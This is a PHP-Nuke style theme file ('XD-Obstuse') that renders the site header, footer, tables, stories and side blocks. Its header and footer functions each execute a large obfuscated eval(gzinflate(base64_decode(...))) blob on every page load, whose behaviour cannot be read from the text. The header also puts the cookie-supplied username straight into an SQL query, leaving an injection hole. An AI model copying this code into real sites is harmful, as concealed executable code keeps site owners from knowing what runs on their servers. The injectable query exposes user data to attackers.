<?php

/************************************************************/
/* Theme Colors Definition                                  */
/************************************************************/

$bgcolor1 = "#2E2F2B";
$bgcolor2 = "#2E2F2B";
$bgcolor3 = "#434343";
$bgcolor4 = "#2E2F2B";
$textcolor1 = "#ffffff";
$textcolor2 = "#ffffff";

/************************************************************/
/* OpenTable Functions                                      */
/************************************************************/

function OpenTable() {
    global $tableStatus;
if ($tableStatus != "open"){
    ?><style type="text/css">
<!--
body {
	background-image: url(themes/XD-Obstuse/images/bg.gif);
}
.style2 {color: #FFFFFF}
-->
</style>
<table width=98% height="26" border=0 align="center" cellpadding=0 cellspacing=0>
  <tr>
    <td valign="top"><table width=100% border=0 align="center" cellpadding=0 cellspacing=0>
        <tr>
          <td width="20" valign="top"><IMG SRC="themes/XD-Obstuse/images/TBL/XD-Obstuso_TBL_01.gif" WIDTH=57 HEIGHT=37 ALT=""></td>
          <td width="100%" background="themes/XD-Obstuse/images/TBL/XD-Obstuso_TBL_03.gif"><div align="center"></div></td>
          <td width="19" valign="top"><div align="right"> <IMG SRC="themes/XD-Obstuse/images/TBL/XD-Obstuso_TBL_05.gif" WIDTH=58 HEIGHT=37 ALT=""></div></td>
        </tr>
      </table>
        <table width=100% height="26" border=0 align="center" cellpadding=0 cellspacing=0>
          <tr>
            <td width="15" valign="top" background="themes/XD-Obstuse/images/TBL/XD-Obstuso_TBL_09.gif"><IMG SRC="themes/XD-Obstuse/images/TBL/XD-Obstuso_TBL_09.gif" WIDTH=15 HEIGHT=1 ALT=""></td>
            <td valign="top" bgcolor="#151515"><font face=verdana,arial,helvetica size=1><font face=verdana,arial,helvetica size=1>
              <?

$tableStatus = "open";

}
else {}
}

function OpenTable2() {
    global $bgcolor1, $bgcolor2;
    echo "<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" ><tr><td class=row1>\n";
    echo "<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" ><tr><td>\n";
}

function CloseTable() {
    global $tableStatus;
if ($tableStatus == "open"){
    ?>
            </font></font></td>
            <td width="15" valign="top" background="themes/XD-Obstuse/images/TBL/XD-Obstuso_TBL_10.gif"><div align="right"><IMG SRC="themes/XD-Obstuse/images/TBL/XD-Obstuso_TBL_10.gif" WIDTH=15 HEIGHT=1 ALT=""></div></td>
          </tr>
        </table>
        <table width=100% border=0 align="center" cellpadding=0 cellspacing=0>
          <tr>
            <td width="11" valign="top"><IMG SRC="themes/XD-Obstuse/images/TBL/XD-Obstuso_TBL_13.gif" WIDTH=52 HEIGHT=29 ALT=""></td>
            <td valign="top" background="themes/XD-Obstuse/images/TBL/XD-Obstuso_TBL_15.gif">&nbsp;</td>
            <td width="19" valign="top" background=""><div align="right"><IMG SRC="themes/XD-Obstuse/images/TBL/XD-Obstuso_TBL_17.gif" WIDTH=58 HEIGHT=29 ALT=""></div></td>
          </tr>
      </table></td>
  </tr>
</table>
<?

$tableStatus = "closed";
}
else {}
}

function CloseTable2() {
    echo "</td></tr></table></td></tr></table>\n";
}

/************************************************************/
/* FormatStory                                              */
/************************************************************/
function FormatStory($thetext, $notes, $aid, $informant) {
    global $anonymous;
    if ($notes != "") {
        $notes = "<br><br><b>"._NOTE."</b> <i>$notes</i>\n";
    } else {
        $notes = "";
    }
    if ("$aid" == "$informant") {
        echo "<font class=\"content\" color=\"#505050\">$thetext$notes</font>\n";
    } else {
        if($informant != "") {
            $boxstuff = "News submitted by: <a href=\"modules.php?name=Your_Account&amp;op=userinfo&amp;username=$informant\">$informant</a><br><br>";
        } else {
            $boxstuff = "News submitted by: $anonymous<br><br>";
        }
        $boxstuff .= "$thetext$notes\n";
        echo "<font class=\"content\" color=\"#505050\">$boxstuff</font>\n";
    }
}

/************************************************************/
/* Function themeheader()                                   */
/************************************************************/
    function themeheader() {
    global $user, $cookie, $prefix, $user_prefix, $db, $dbi, $userinfo, $sitekey, $name;
  $ThemeSel = get_theme();

	if (file_exists("themes/$ThemeSel/functions.php")){
		require_once("themes/$ThemeSel/functions.php");
	}
    cookiedecode($user);
    mt_srand ((double)microtime()*1000000);
    $maxran = 1000000;
    $random_num = mt_rand(0, $maxran);
    $datekey = date("F j");
    $rcode = hexdec(md5($_SERVER[HTTP_USER_AGENT] . $sitekey . $random_num . $datekey));
    $code = substr($rcode, 2, 6);
    $username = $cookie[1];
 if ($username == "") {
        $username = "GUEST";
    }
//************* Theme Cpanel Compatibility. Do not remove these lines unless you know what you are doing. They affect the theme **************/
	$sql = "SELECT link1name, link2name, link3name, link4name, link5name, link1url, link2url, link3url, link4url, link5url, themeflash, themesearch, pmpop, leftblockstemp, rightblockstemp, sitemsg, sitelogin, broadcastmsg, clock, forumleftblocks FROM ".$prefix."_themecpanel";
	$result = $db->sql_query($sql);
	$row = $db->sql_fetchrow($result);
	$themesearch = $row[themesearch];
	$pmpop = $row[pmpop];
	$leftblockstemp = $row[leftblockstemp];
	$rightblockstemp = $row[rightblockstemp];
	$sitemsg = $row[sitemsg];
	$sitelogin = $row[sitelogin];
	$broadcastmsg = $row[broadcastmsg];
	$clock = $row[clock];
	$forumleftblocks = $row[forumleftblocks];

    $uresult = $db->sql_query("select user_id from ".$user_prefix."_users where username='$username'");
    list($uid) = $db->sql_fetchrow($uresult);
    $presult = $db->sql_query("select * from ".$prefix."_bbprivmsgs where privmsgs_to_userid='$uid' AND (privmsgs_type='0' OR privmsgs_type='1' OR privmsgs_type='3' OR privmsgs_type='5')");
    $pnumrow = $db->sql_numrows($presult);
    $public_msg = public_message(); 
    echo "$public_msg";
	
eval(gzinflate(base64_decode('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'))); 
       echo "<table width=\"998\" cellpadding=\"0\" cellspacing=\"0\" border=\"0\" align=\"center\">\n"
		."<tr valign=\"top\">\n"
        ."<td width=\"10\" valign=\"top\" background=\"themes/XD-Obstuse/images/leftBG.gif\"><img src=\"themes/XD-Obstuse/images/leftBG.gif\" width=\"20\" height=\"2\" border=\"0\"></td>\n"// Este es el De la izquierda 
		."<td width=\"170\" background=\"themes/XD-Obstuse/images/mainBG.gif\" valign=\"top\">\n"; // Este es el BG de los BLocks
    global $swapleftright; 
  $swapleftright = "1"; 
   if ($name=='Admin') { 
} else { 
blocks(left); 
} ; 
  $swapleftright = "0"; 
echo "</td>\n"
    	."<td width=\"5\" valign=\"top\" background=\"themes/XD-Obstuse/images/rightBG.gif\"><img src=\"themes/XD-Obstuse/images/rightBG.gif\" width=\"17\" height=\"2\" border=\"0\"></td>\n"
    	."<td width=\"100%\">\n";
}


/************************************************************/
/* Function themefooter()                                   */
/************************************************************/

function themefooter() {
    global $index, $user, $banners, $cookie, $prefix, $db, $dbi, $total_time, $start_time, $foot1, $foot2, $foot3, $foot4;
	if ($banners == 1) { 
        include("includes/banners2.php"); 
    } 
    $mtime = microtime();
    $mtime = explode(" ",$mtime);
    $mtime = $mtime[1] + $mtime[0];
    $end_time = $mtime;
    $total_time = ($end_time - $start_time);
    $total_time = "".substr($total_time,0,5)." "._SECONDS."";
	
	global $prefix, $db;

$a = 1;
$sql = "SELECT lid, title FROM ".$prefix."_downloads_downloads ORDER BY hits DESC LIMIT 0,10";
$result = $db->sql_query($sql);
while ($row = $db->sql_fetchrow($result)) {
    $title2 = ereg_replace("_", " ", $row[title]);
   // $content .= "<strong><big>&middot;</big></strong>&nbsp;$a: <a href=\"modules.php?name=Downloads&amp;d_op=viewdownloaddetails&amp;lid=$row[lid]&amp;title=$row[title]\">$title2</a><br>";
	$content .= "&nbsp;$a:<a href=\"modules.php?name=Downloads&amp;d_op=viewdownloaddetails&amp;lid=$row[lid]&amp;title=$row[title]\"><img src=\"themes/XD-Obstuse/images/fdl.gif\" border=0></a><a href=\"modules.php?name=Downloads&amp;d_op=viewdownloaddetails&amp;lid=$row[lid]&amp;title=$row[title]\">$title2</a><br>";
	 //$showdl = " <font class=copyright></b><br><A name= \"scrollingCode\"></A><MARQUEE behavior= \"scroll\" align= \"left\" direction= \"up\" height=\"90\" scrollamount= \"2\" scrolldelay= \"90\" onmouseover='this.stop()' onmouseout='this.start()'>$content";
	 $showdl = " <font class=copyright><A name= \"scrollingCode\"><MARQUEE behavior= \"scroll\" align= \"left\" direction= \"up\" height=\"110\" scrollamount= \"2\" scrolldelay= \"90\" onmouseover='this.stop()' onmouseout='this.start()'>$content";
    $a++;
}


    if ($index == 1) {
		echo "</td>\n"
	    ."<td width=\"3\" valign=\"top\"><img src=\"themes/XD-Obstuse/images/spacer.gif\" width=\"3\" height=\"0\" border=\"0\"></td>\n"
	    ."<td width=\"180\" valign=\"top\">\n";
	blocks(right);
    }
    echo "</td>\n"
	."<td width=\"20\" valign=\"top\" background=\"themes/XD-Obstuse/images/XD-Obstuso_LEFT.gif\"><img src=\"themes/XD-Obstuse/images/XD-Obstuso_LEFT.gif\" width=\"28\" height=\"1\" border=\"0\"></td>\n"
	."</tr>\n"
	."</table>\n";
    $footer_message = "$foot1<br>$foot2<br>$foot3<br>$foot4";
eval(gzinflate(base64_decode('DdRFjuRYAEXRrfSsKvUHZlKPjGGmME9aZocpzLT6ziU83aNXHmn/t34+Y9WnW/k3S9eSxP8ryvxblH//CIWCifMWs53gLv4TQvHKPsAOXLY9lkhQJRNXVJjHkZypTgezlphYgV4Q+9yV64KRJg3QzyyDAMmkSMog6GP5st4zS+y1nEXoI+vqWXJbUbQ7vFZiJmKupKT39K2K+XoDchxQIpyqrgpl1jDSm8vygBw0lX0SiTyysxG99MgnZqWDkc3PFpz1IS7fE5XeYKY3sOv1ehbPc2IVw1mnojSQm6xd5Pdf3YeVzQPOFl2oQVfp4my7kSswfh6EGCKl+118txbZPeJw7YaDwyG0dx58z9pKV2oQrzWqSTpyYkEfwLszN5mTkQ2ERHUPgptmOJESCVNdtpDRPBoNBDDsNsPps8/Uh3qkaLlZ88DWtJvKy0HYas8FfzO1StAParJk+UhU95G+lrkI/kXt9i4+NiEcCZZAHEQtKpOtlupNmGukxT7A2GfKoZBV/BeI3vaUBD4tqvDSPvWoTyc9JlKBEEjW88SuwGrZgIpXaOM0tDu7Rr4zr8IHh1NdbNAuOdZycj8k6Tdg+IyScmIL5BpZ4cyGaQVJsVCrTnkKZMYz92YS4SpHYLUGKPFavm2JXDjl2+E4M1ewtSiXH+/gavkAacBXJZyOmD7ifGNoVkwdU8wUvO8KM/QaGT69Q3dmL1I4TpD6JaDiZCc7kVXaziQOmeLP/rlye82Gcx4r4tehtiYG5PaX/AtJY9AKrL1sVBGMOM5RSt5tQUUrXFh8Iwa6mQkTqJ6hk/uqa6sOkzQdqmvdIwk/OJuP8NyshVH2sdf2tdUo0+k3PcsLN/svKsAV+S3NxrDgIOMgTqbHjD0SMCazSJNLzidEpFpBqFra5TUkoBG1VwakeM8Ny0hiinqi1lCpZZoff6fRhIoyeNOPIh2DdaRrrDtJT886SbQTL7gPESgY7QbNGDbqkbYfwZyu8psPcZI1iDGSu4rB4F5DOkXxlUuRFhkFJ/soyWadezVm6jRPL1uRBGG3xo94/GqqpGYAwlPtgfQQ3a9oIrfWvdpT492+iE5TWGu1DnqgA+WNfYxkYCFXQBBmNFLdrrqISJ5IM+IWxPeg+/u32ap3ClsCNH3XDdnCsbgdqsCblqCecYgjPRA818oCbIVFmvptsUX+bstjgSwy/+WUp8quy1SuUmxQiI41yOYsxdtdk3zcsDTNK/Y4PpOM8BLjOD6yTYOx1fnu2oF2bfOFjucm8LIm+MdKmlK3t+YE4/VSSrbm0HujKLFSNEKfgcky20siQMJgEfPkXbR8OnQLu7KmxiMD2rvvXuhDNcPnlXn3HBVEAI1w96BL5/Jbx0Jza2sTJISD5G3vGLsUx5Nechp8fBHVQ6A5sddTZzS9TSKKS1TDiiA6lnSa3Pr9uz+ZM0vktwfWzBvtmm54aOkdGFiZ3vFeRnny+0bLQuhO/GIADoK0jGmTnmb5E0hgI0MY0ebmhbTdjPgv9g7Uq2VNStaU6Lxnxx7cYj5qEw4Vwzo9bRxdCuOW+4tN5vL0Ny/w41psDCKU44r2dzpftNdeW7Fog4BLtX4gYeq5+OBVhTI0ptPVZHuu56x/bQwCkD0eFYTbf35+fv79538='))); 
}

/************************************************************/
/* Function themeindex()                                    */
/* This function format the stories on the Homepage         */
/************************************************************/
function themeindex ($aid, $informant, $time, $title, $counter, $topic, $thetext, $notes, $morelink, $topicname, $topicimage, $topictext) {
    global $anonymous, $tipath;

$ThemeSel = get_theme();
    if (file_exists("themes/$ThemeSel/images/topics/$topicimage")) {
		$t_image = "themes/$ThemeSel/images/topics/$topicimage";
    } 
	else {$t_image = "$tipath$topicimage";}
    if ($notes != "") { $notes = "<br><br><b>Admin's Comment:</b> $notes\n"; } 
	else {$notes = "";}
    if ("$aid" == "$informant") {$content = "$thetext$notes\n";}
	 else {
        if($informant != "") {
            $content = "News submitted by: <a href=\"modules.php?name=Your_Account&amp;op=userinfo&amp;username=$informant\">$informant</a><br><br>";
        } 
		else {$content = "News submitted by: <i>$anonymous</i><br><br>";}
        $content .= "$thetext$notes\n";
    }
    $posted = ""._POSTEDBY." ";
    $posted .= " "._ON." $time $timezone ";

    $tmpl_file = "themes/XD-Obstuse/story_home.htm";
    $thefile = implode("", file($tmpl_file));
    $thefile = addslashes($thefile);
    $thefile = "\$r_file=\"".$thefile."\";";
    eval($thefile);
    print $r_file;
}

/************************************************************/
/* Function themeindex()                                    */
/************************************************************/

function themearticle ($aid, $informant, $datetime, $title, $thetext, $topic, $topicname, $topicimage, $topictext) {
    global $admin, $sid, $tipath;
	$ThemeSel = get_theme();
    if (file_exists("themes/$ThemeSel/images/topics/$topicimage")) {
	$t_image = "themes/$ThemeSel/images/topics/$topicimage";
    } else {
	$t_image = "$tipath$topicimage";
}
    $posted = ""._POSTEDON." $datetime "._BY." ";
    $posted .= get_author($aid);
    if ($notes != "") {
        $notes = "<br><br><b>Admin's Comment:</b> <i>$notes</i>\n";
    } else {
        $notes = "";
    }
    if ("$aid" == "$informant") {
        $content = "$thetext$notes\n";
    } else {
        if($informant != "") {
            $content = "News submitted by: <a href=\"modules.php?name=Your_Account&amp;op=userinfo&amp;username=$informant\">$informant</a><br><br> ";
        } else {
            $content = "News submitted by: <i>$anonymous</i><br><br>";
        }
        $content .= "$thetext$notes\n";
    }
    $tmpl_file = "themes/XD-Obstuse/story_page.htm";
    $thefile = implode("", file($tmpl_file));
    $thefile = addslashes($thefile);
    $thefile = "\$r_file=\"".$thefile."\";";
    eval($thefile);
    print $r_file;
}

/************************************************************/
/* Function themesidebox()                                  */
/************************************************************/
function themesidebox($title, $content) { 
   global $swapleftright, $bgcolor1, $bgcolor2; 

if ($swapleftright=="0") { 
    $tmpl_file = "themes/XD-Obstuse/blockR.html"; 
} else { 
    $tmpl_file = "themes/XD-Obstuse/blockL.html"; 
} 

$ThemeSel = get_theme(); // block image titles code
$giftitle = "themes/$ThemeSel/images/block-titles/$title.gif";
$jpgtitle = "themes/$ThemeSel/images/block-titles/$title.jpg";
$jpegtitle = "themes/$ThemeSel/images/block-titles/$title.jpeg";
$pngtitle = "themes/$ThemeSel/images/block-titles/$title.png";
if(file_exists($pngtitle)){
	$title = "<img src=\"$pngtitle\">";
}
else if (file_exists($jpegtitle)){
	$title = "<img src=\"$jpegtitle\">";
}
else if(file_exists($jpgtitle)){
	$title = "<img src=\"$jpgtitle\">";
}
else if (file_exists($giftitle)){
	$title = "<img src=\"$giftitle\">";
}

$thefile = implode("", file($tmpl_file)); 
$thefile = addslashes($thefile); 
$thefile = "\$r_file=\"".$thefile."\";"; 
eval($thefile); 
print $r_file; 

}
?>